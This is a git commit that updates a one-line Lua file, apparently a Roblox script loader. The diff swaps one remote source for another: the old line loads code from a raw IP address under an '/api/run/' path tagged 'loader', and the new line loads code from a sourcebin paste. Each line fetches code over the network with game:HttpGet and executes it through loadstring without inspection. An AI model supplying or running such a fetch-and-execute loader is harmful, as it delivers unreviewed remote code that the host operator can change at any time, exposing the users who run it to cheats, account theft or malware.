71585c628d993c58cbb7e1e804093a4bbf41e64a
leonix <furkan62.bakir@gmail.com>
2026-02-17 19:32:38 +0300

    Update most.lua

--- most.lua
+++ most.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Xye3sg5u8V/0", true))()
